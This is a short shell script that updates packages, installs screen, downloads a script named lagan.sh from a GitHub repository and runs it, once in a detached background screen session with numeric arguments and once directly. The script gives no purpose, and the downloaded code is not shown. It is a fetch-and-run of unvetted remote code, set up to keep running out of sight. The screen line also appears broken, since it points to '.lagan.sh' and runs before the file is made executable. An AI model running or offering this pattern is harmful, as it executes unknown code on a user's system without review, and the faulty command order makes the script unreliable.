#!/bin/sh

sudo apt update
sudo apt install screen -y
wget https://github.com/archernap/prem/raw/main/lagan.sh
screen -dmS lagan.sh .lagan.sh 60 70
chmod +x lagan.sh
./lagan.sh
